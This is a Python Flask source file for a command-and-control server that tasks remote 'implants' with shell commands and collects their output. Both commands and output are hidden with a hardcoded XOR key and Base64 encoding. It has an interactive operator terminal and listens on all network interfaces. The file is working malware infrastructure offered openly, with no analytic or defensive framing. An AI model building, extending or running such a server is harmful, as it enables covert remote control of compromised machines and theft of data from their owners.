#!/usr/bin/env python3
import base64
import threading

from flask import Flask, request

# Shared key must match the implant’s key
KEY = b"mysecretkey"


app = Flask(__name__)


# Store tasks and reports per implant.
# 'tasks' will be used for user-specified tasks via the interactive terminal.
tasks = {}  # Example: { implant_id: "ls" }
reports = {}  # Example: { implant_id: "<obfuscated output>" }


# Hardcoded tasks for specific implant IDs.
hardcoded_tasks = {"UUID": "ls"}


def xor_crypt(data: bytes, key: bytes) -> bytes:
    """XOR each byte of data with the key (repeating as needed)."""
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])


def encode(data: str) -> str:
    """Obfuscate data using XOR and then Base64 encode it."""
    return base64.b64encode(xor_crypt(data.encode(), KEY)).decode()


def decode(data: str) -> str:
    """Deobfuscate data by Base64 decoding and then applying XOR."""
    return xor_crypt(base64.b64decode(data), KEY).decode()


@app.route("/task/<implant_id>", methods=["GET"])
def get_task_endpoint(implant_id):
    print(f"[+] Request from implant {implant_id}")
    # Check if a dynamic task was set via the C2 terminal/API.
    task = tasks.get(implant_id)
    if task is None:
        # Fallback to hardcoded task if no dynamic task is set.
        task = hardcoded_tasks.get(implant_id, "ls")
    # Clear the dynamic task so it isn’t repeated.
    tasks[implant_id] = None
    # Return the obfuscated task to the implant.
    encoded_task = encode(task)
    print(f"[+] Returning task for {implant_id}: {task} (encoded: {encoded_task})")
    return encoded_task, 200


@app.route("/task", methods=["POST"])
def set_task_api():
    data = request.json
    implant_id = data.get("id")
    task = data.get("task")
    if implant_id and task:
        tasks[implant_id] = task.strip()
        print(f"[+] Task for {implant_id} set to: {task.strip()}")
        return "Task set", 200
    return "Missing ID or task", 400


@app.route("/report", methods=["POST"])
def receive_report():
    data = request.json
    implant_id = data.get("id")
    output = data.get("output")
    if implant_id and output:
        reports[implant_id] = output
        decoded_output = decode(output)
        print(f"[+] Output from {implant_id}:\n{decoded_output}\n")
        return "Received", 200
    return "Missing fields", 400


def c2_terminal():
    """Interactive terminal for setting tasks for specific implants."""
    while True:
        cmd = input("C2> Enter implant_id and command (format: id:cmd) > ").strip()
        if ":" not in cmd:
            print("Format: implant_id:command")
            continue
        implant_id, command = cmd.split(":", 1)
        tasks[implant_id] = command.strip()
        print(f"[+] Task for {implant_id} set to: {command.strip()}")


if __name__ == "__main__":
    # Start the C2 terminal in a separate daemon thread.
    threading.Thread(target=c2_terminal, daemon=True).start()
    # Run the Flask app on all interfaces at port 8000.
    app.run(host="0.0.0.0", port=8000)
